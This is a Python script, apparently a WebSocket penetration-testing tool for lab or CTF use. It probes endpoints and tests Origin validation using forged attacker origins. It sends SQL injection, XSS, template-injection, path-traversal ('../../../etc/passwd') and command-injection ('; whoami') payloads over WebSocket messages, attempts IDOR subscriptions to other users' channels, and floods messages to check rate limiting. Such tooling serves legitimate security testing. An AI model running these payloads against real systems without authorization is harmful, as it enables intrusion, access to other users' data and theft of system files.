#!/usr/bin/env python3
# For authorized testing in lab/CTF environments only
"""WebSocket vulnerability assessment agent using websockets and requests."""

import argparse
import asyncio
import json
import logging
import sys
from typing import List, Optional

try:
    import websockets
except ImportError:
    sys.exit("websockets is required: pip install websockets")

try:
    import requests
except ImportError:
    sys.exit("requests is required: pip install requests")

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


def discover_ws_endpoints(base_url: str) -> List[dict]:
    """Probe common WebSocket endpoint paths."""
    paths = ["/ws", "/websocket", "/socket", "/socket.io/?EIO=4&transport=polling",
             "/signalr/negotiate", "/chat", "/notifications", "/live", "/api/ws"]
    found = []
    for path in paths:
        try:
            resp = requests.get(f"{base_url}{path}", timeout=5, verify=False,
                                headers={"Upgrade": "websocket", "Connection": "Upgrade",
                                          "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                                          "Sec-WebSocket-Version": "13"})
            if resp.status_code in (101, 200, 400):
                found.append({"path": path, "status": resp.status_code})
        except requests.RequestException:
            continue
    logger.info("Found %d potential WebSocket endpoints", len(found))
    return found


def test_origin_validation(ws_url: str, cookie: str = "") -> dict:
    """Test if the WebSocket server validates the Origin header."""
    evil_origins = ["https://evil.example.com", "https://attacker.com", "null"]
    results = []
    for origin in evil_origins:
        headers = {"Origin": origin}
        if cookie:
            headers["Cookie"] = cookie
        try:
            resp = requests.get(
                ws_url.replace("wss://", "https://").replace("ws://", "http://"),
                headers={**headers, "Upgrade": "websocket", "Connection": "Upgrade",
                         "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                         "Sec-WebSocket-Version": "13"},
                timeout=5, verify=False,
            )
            results.append({
                "origin": origin,
                "status_code": resp.status_code,
                "accepted": resp.status_code == 101,
            })
        except requests.RequestException as exc:
            results.append({"origin": origin, "error": str(exc)})

    cswsh_vulnerable = any(r.get("accepted") for r in results)
    return {"test": "origin_validation", "results": results, "cswsh_vulnerable": cswsh_vulnerable}


async def test_no_auth_connect(ws_url: str) -> dict:
    """Test if WebSocket connection succeeds without authentication."""
    try:
        async with websockets.connect(ws_url, open_timeout=5) as ws:
            return {"test": "no_auth", "connected": True, "risk": "HIGH"}
    except Exception as exc:
        return {"test": "no_auth", "connected": False, "error": str(exc)}


async def test_message_injection(ws_url: str, cookie: str = "") -> List[dict]:
    """Test WebSocket messages for injection vulnerabilities."""
    injection_payloads = [
        {"action": "search", "query": "' OR 1=1--"},
        {"action": "search", "query": "<script>alert(1)</script>"},
        {"action": "search", "query": "{{7*7}}"},
        {"action": "search", "query": "${7*7}"},
        {"action": "read", "file": "../../../etc/passwd"},
        {"action": "exec", "cmd": "; whoami"},
    ]
    headers = {}
    if cookie:
        headers["Cookie"] = cookie

    results = []
    try:
        async with websockets.connect(ws_url, extra_headers=headers, open_timeout=5) as ws:
            for payload in injection_payloads:
                await ws.send(json.dumps(payload))
                try:
                    response = await asyncio.wait_for(ws.recv(), timeout=5)
                    results.append({
                        "payload": payload,
                        "response": response[:300],
                        "suspicious": any(kw in response.lower() for kw in
                                          ["error", "sql", "root:", "uid=", "49"]),
                    })
                except asyncio.TimeoutError:
                    results.append({"payload": payload, "response": "TIMEOUT"})
    except Exception as exc:
        results.append({"error": str(exc)})

    return results


async def test_idor_channels(ws_url: str, cookie: str = "",
                              channel_ids: Optional[List[int]] = None) -> List[dict]:
    """Test for IDOR by subscribing to other users' channels."""
    ids = channel_ids or list(range(1, 6))
    results = []
    headers = {"Cookie": cookie} if cookie else {}
    try:
        async with websockets.connect(ws_url, extra_headers=headers, open_timeout=5) as ws:
            for cid in ids:
                msg = json.dumps({"type": "subscribe", "channel_id": cid})
                await ws.send(msg)
                try:
                    resp = await asyncio.wait_for(ws.recv(), timeout=5)
                    results.append({"channel_id": cid, "response": resp[:200], "accessible": "error" not in resp.lower()})
                except asyncio.TimeoutError:
                    results.append({"channel_id": cid, "response": "TIMEOUT"})
    except Exception as exc:
        results.append({"error": str(exc)})
    return results


async def test_rate_limiting(ws_url: str, cookie: str = "", count: int = 100) -> dict:
    """Test if message rate limiting is enforced."""
    import time
    headers = {"Cookie": cookie} if cookie else {}
    try:
        async with websockets.connect(ws_url, extra_headers=headers, open_timeout=5) as ws:
            start = time.time()
            sent = 0
            for i in range(count):
                try:
                    await ws.send(json.dumps({"type": "ping", "seq": i}))
                    sent += 1
                except websockets.ConnectionClosed:
                    break
            elapsed = time.time() - start
            return {
                "test": "rate_limiting",
                "messages_sent": sent,
                "target_count": count,
                "elapsed_seconds": round(elapsed, 2),
                "rate_limited": sent < count,
            }
    except Exception as exc:
        return {"test": "rate_limiting", "error": str(exc)}


def run_assessment(ws_url: str, cookie: str = "") -> dict:
    """Run complete WebSocket security assessment."""
    origin_test = test_origin_validation(ws_url, cookie)

    loop = asyncio.new_event_loop()
    no_auth = loop.run_until_complete(test_no_auth_connect(ws_url))
    injections = loop.run_until_complete(test_message_injection(ws_url, cookie))
    idor = loop.run_until_complete(test_idor_channels(ws_url, cookie))
    rate = loop.run_until_complete(test_rate_limiting(ws_url, cookie))
    loop.close()

    findings = []
    if origin_test.get("cswsh_vulnerable"):
        findings.append("HIGH: Cross-Site WebSocket Hijacking possible (no Origin validation)")
    if no_auth.get("connected"):
        findings.append("HIGH: WebSocket accepts unauthenticated connections")
    if any(i.get("suspicious") for i in injections if isinstance(i, dict)):
        findings.append("MEDIUM: Potential injection in WebSocket messages")
    if not rate.get("rate_limited", True):
        findings.append("MEDIUM: No message rate limiting detected")

    return {
        "target": ws_url,
        "origin_validation": origin_test,
        "unauthenticated_access": no_auth,
        "injection_tests": injections,
        "idor_tests": idor,
        "rate_limiting": rate,
        "findings": findings,
    }


def main():
    parser = argparse.ArgumentParser(description="WebSocket Vulnerability Assessment Agent")
    parser.add_argument("--url", required=True, help="WebSocket URL (wss://...)")
    parser.add_argument("--cookie", default="", help="Session cookie")
    parser.add_argument("--output", default="websocket_report.json")
    args = parser.parse_args()

    report = run_assessment(args.url, args.cookie)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
